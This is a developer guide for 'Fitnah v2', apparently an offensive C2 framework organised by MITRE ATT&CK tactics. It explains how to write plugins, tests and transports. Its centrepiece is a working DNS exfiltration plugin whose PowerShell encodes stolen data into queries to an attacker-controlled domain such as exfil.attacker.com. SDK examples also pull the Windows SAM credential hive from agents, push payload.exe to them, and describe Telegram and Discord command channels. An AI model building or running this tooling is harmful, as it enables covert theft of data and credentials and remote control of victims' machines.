# Development Guide — Fitnah v2

This guide explains how to add new plugins, understand the SDK, write tests, and extend the framework with new transports or builder formats.

---

## Adding a New Plugin (Step by Step)

### Step 1 — Choose a category

Plugins live in `fitnah/plugins/<category>/`. Current categories:

| Category | MITRE Tactic |
|---|---|
| `recon` | Discovery |
| `credential_access` | Credential Access |
| `execution` | Execution |
| `persistence` | Persistence |
| `privilege_escalation` | Privilege Escalation |
| `defense_evasion` | Defense Evasion |
| `lateral_movement` | Lateral Movement |
| `collection` | Collection |
| `exfiltration` | Exfiltration |
| `impact` | Impact |
| `initial_access` | Initial Access |

### Step 2 — Create the file

```bash
# Example: add a DNS exfiltration plugin
touch fitnah/plugins/exfiltration/dns_exfil.py
```

### Step 3 — Write the plugin

```python
"""exfiltration/dns_exfil — exfiltrate data via DNS TXT queries."""
from __future__ import annotations
from fitnah.sdk import BasePlugin, ModuleResult
from fitnah.sdk.schema import Param, ParamSchema


class DnsExfil(BasePlugin):
    NAME        = "dns_exfil"
    DESCRIPTION = "Exfiltrate data by encoding it into DNS TXT queries"
    CATEGORY    = "exfiltration"
    MITRE       = "T1048.003"
    AUTHOR      = "your-handle"

    schema = ParamSchema().add(
        Param("data",       str, required=True,
              help="String or file path to exfiltrate"),
        Param("domain",     str, required=True,
              help="Attacker-controlled domain receiving DNS queries"),
        Param("chunk_size", int, required=False, default=32,
              help="Bytes per DNS query label"),
    )

    def run(self, session, params, ctx=None) -> ModuleResult:
        if ctx is None:
            return ModuleResult.err("Requires live session")

        data       = params.get("data", "")
        domain     = params.get("domain", "")
        chunk_size = int(params.get("chunk_size", 32))

        if not data or not domain:
            return ModuleResult.err("data and domain are required")

        # Build PowerShell that encodes data and fires DNS queries
        ps_script = """
$data = '{data}'
$domain = '{domain}'
$bytes = [System.Text.Encoding]::UTF8.GetBytes($data)
$b64 = [Convert]::ToBase64String($bytes) -replace '=',''
$chunk = {chunk_size}
for ($i = 0; $i -lt $b64.Length; $i += $chunk) {{
    $label = $b64.Substring($i, [Math]::Min($chunk, $b64.Length - $i))
    Resolve-DnsName "$label.$domain" -ErrorAction SilentlyContinue | Out-Null
}}
Write-Output "Exfiltrated $($b64.Length) base64 chars across DNS"
""".format(data=data.replace("'", "''"), domain=domain, chunk_size=chunk_size)

        result = ctx.ps(ps_script)
        return ModuleResult.ok(data={"output": result, "domain": domain})
```

### Step 4 — Test it

```python
# tests/test_dns_exfil.py
from fitnah.sdk.testing import MockSession
from fitnah.sdk.context import MockContext  # if available
from fitnah.plugins.exfiltration.dns_exfil import DnsExfil


def test_dns_exfil_requires_session():
    """Plugin must return error when ctx is None (offline mode)."""
    plugin = DnsExfil()
    session = MockSession()
    result = plugin.run(session, {"data": "test", "domain": "evil.com"}, ctx=None)
    assert not result.ok
    assert "live session" in result.error.lower()


def test_dns_exfil_missing_domain():
    """Plugin must return error when required param is absent."""
    plugin = DnsExfil()
    session = MockSession()
    # Simulate ctx presence with a mock that captures ps() calls
    class FakeCtx:
        def ps(self, script): return "ok"
        def exec(self, cmd): return "ok"
    result = plugin.run(session, {"data": "test"}, ctx=FakeCtx())
    assert not result.ok
```

### Step 5 — Hot-reload and test in the console

```
op_nightfall > reload
  [+] Reloaded 75 plugin(s).
op_nightfall > info dns_exfil
op_nightfall > use dns_exfil
op_nightfall > set data "supersecret"
op_nightfall > set domain exfil.attacker.com
op_nightfall > run
```

---

## SDK Reference

### BasePlugin

```python
from fitnah.sdk import BasePlugin, ModuleResult
from fitnah.sdk.schema import Param, ParamSchema

class MyPlugin(BasePlugin):
    NAME        = "my_plugin"         # used as the console command
    DESCRIPTION = "One-line description"
    CATEGORY    = "recon"             # must match a category directory
    MITRE       = "T1082"             # MITRE ATT&CK technique ID
    AUTHOR      = "optional"
    VERSION     = "1.0"

    schema = ParamSchema().add(
        Param("target", str, required=True,  help="IP or hostname"),
        Param("port",   int, required=False, default=443, help="Port"),
    )

    def run(self, session, params, ctx=None) -> ModuleResult:
        if ctx is None:
            return ModuleResult.err("Requires live session")
        target = params.get("target")
        port   = int(params.get("port", 443))
        # ... do work ...
        return ModuleResult.ok(data={"target": target, "port": port})
```

### ModuleResult

```python
# Success
ModuleResult.ok(data={"key": "value"})
ModuleResult.ok(data="plain string output")

# Failure
ModuleResult.err("Human-readable error message")

# Partial (got some results but also an error)
ModuleResult.partial(data={"partial": "result"}, error="timed out after 10s")

# Checking results
result.ok          # bool
result.error       # str or None
result.data        # any
result.status      # ModuleStatus enum
result.metadata    # dict (auto-populated by kernel: agent_id, loot_id, ts)
```

### ParamSchema and Param

```python
from fitnah.sdk.schema import Param, ParamSchema

schema = ParamSchema().add(
    # Basic string param
    Param("name", str, required=True, help="Description"),

    # Optional with default
    Param("method", str, required=False, default="auto", help="auto|nmap|ps"),

    # With validator (replaces the removed choices= kwarg)
    Param("mode", str, required=True, default="detect",
          validator=lambda v: v in ("detect", "exploit"),
          help="detect or exploit"),

    # Integer
    Param("port", int, required=False, default=443, help="Port number"),
)
```

**Important:** `Param` does **not** have a `choices=` keyword argument. Use `validator=` instead.

### PluginContext

`ctx` is a `PluginContext` that bridges the synchronous plugin to the async C2 loop.

```python
# Execute a shell command on the agent (cmd /c)
output = ctx.exec("whoami /all")          # returns str

# Execute PowerShell on the agent
output = ctx.ps("Get-LocalUser")          # returns str

# Send a file to the agent
ctx.upload("C:\\Temp\\payload.exe", b"...")  # bytes

# Download a file from the agent
data = ctx.download("C:\\Windows\\System32\\SAM")  # returns bytes

# Send a raw TASK dict and get the ACK dict back
ack = ctx.send({"command": "exec", "args": {"cmd": "ipconfig"}})

# Agent info
ctx.agent_id    # str
ctx.session     # Session object
```

### MockSession (for tests)

```python
from fitnah.sdk.testing import MockSession

session = MockSession(
    agent_id="test-agent",
    hostname="TESTBOX",
    os="Windows 10",
    ip="192.168.1.1",
    username="testuser",
    priv_level="user",
)
```

---

## Writing Tests

Tests live in `tests/` and are discovered by pytest. Run with:

```bash
python -m pytest tests/ -q          # quiet
python -m pytest tests/ -v          # verbose
python -m pytest tests/test_myfile.py  # single file
python -m pytest -k "test_lsass"    # keyword filter
```

### Test file structure

```python
"""
test_dns_exfil.py — tests for the dns_exfil exfiltration plugin.

Covers:
  - Offline behaviour (no ctx)
  - Missing required param validation
  - Successful execution path (mocked ctx)
"""
import pytest
from fitnah.sdk.testing import MockSession
from fitnah.plugins.exfiltration.dns_exfil import DnsExfil


class TestDnsExfil:
    """Tests for the dns_exfil plugin."""

    def setup_method(self):
        self.plugin = DnsExfil()
        self.session = MockSession()

    def test_requires_live_session(self):
        """Returns error when ctx=None (offline mode)."""
        result = self.plugin.run(self.session, {"data": "x", "domain": "e.com"}, ctx=None)
        assert not result.ok
        assert "live session" in result.error.lower()

    def test_missing_required_params(self):
        """Returns error when required params are absent."""
        class FakeCtx:
            agent_id = "test"
            def ps(self, s): return ""
        result = self.plugin.run(self.session, {}, ctx=FakeCtx())
        assert not result.ok

    def test_successful_execution(self):
        """Returns ok result when ctx.ps() succeeds."""
        class FakeCtx:
            agent_id = "test"
            def ps(self, s): return "Exfiltrated 24 base64 chars across DNS"
        result = self.plugin.run(
            self.session,
            {"data": "hello", "domain": "exfil.test"},
            ctx=FakeCtx()
        )
        assert result.ok
        assert result.data["domain"] == "exfil.test"
```

### conftest.py
The `tests/conftest.py` file suppresses asyncio `RuntimeWarning` from unawaited coroutines in tests that instantiate the kernel without a running event loop.

---

## Plugin Auto-Discovery

The kernel discovers plugins using `pkgutil.walk_packages`:

```python
# fitnah/orchestration/kernel.py
def _load_plugins(self):
    import pkgutil, importlib
    for finder, name, ispkg in pkgutil.walk_packages(
        ["fitnah/plugins"], prefix="fitnah.plugins."
    ):
        if ispkg:
            continue
        mod = importlib.import_module(name)
        for cls_name, cls in inspect.getmembers(mod, inspect.isclass):
            if issubclass(cls, BasePlugin) and cls is not BasePlugin:
                instance = cls()
                self.plugins[instance.NAME] = instance
```

**Rules for auto-discovery:**
1. File must be in `fitnah/plugins/<category>/`
2. Class must subclass `BasePlugin`
3. `NAME`, `DESCRIPTION`, `CATEGORY`, `MITRE` must be set
4. `run(self, session, params, ctx=None)` must be defined

---

## Adding a New C2 Transport

New transports go in `fitnah/c2/transport/`. They must implement the `BaseTransport` interface:

```python
# fitnah/c2/transport/my_transport.py
from fitnah.c2.transport.base import BaseTransport


class MyTransport(BaseTransport):
    PRIORITY = 2   # lower = higher priority (Telegram=0, Discord=1)
    NAME     = "mytransport"

    async def connect(self) -> bool:
        """Attempt connection. Return True on success."""
        ...

    async def disconnect(self) -> None:
        """Clean disconnect."""
        ...

    async def send_message(self, chat_id: str, text: str) -> bool:
        """Send a message to an agent group. Return True on success."""
        ...

    async def run(self) -> None:
        """Main receive loop — call self._on_message(chat_id, text) for each inbound message."""
        ...
```

Register it in `fitnah/c2/router.py` by adding to the transport list.

---

## Project Conventions

- **No `choices=` in Param** — use `validator=lambda v: v in (...)` instead
- **Offline plugins** — if your plugin generates an artefact (phish link, macro) and doesn't need a live session, skip the `ctx is None` guard
- **ModuleResult.ok(data=...)** not `ModuleResult.ok(message=...)` — the `message=` kwarg doesn't exist
- **One MITRE ID per plugin** — comma-separated strings are allowed but keep it to the primary technique
- **CATEGORY must match the directory name** — the kernel uses both to index plugins
- **Tests run with `pytest tests/ -q`** from the project root — always verify before committing
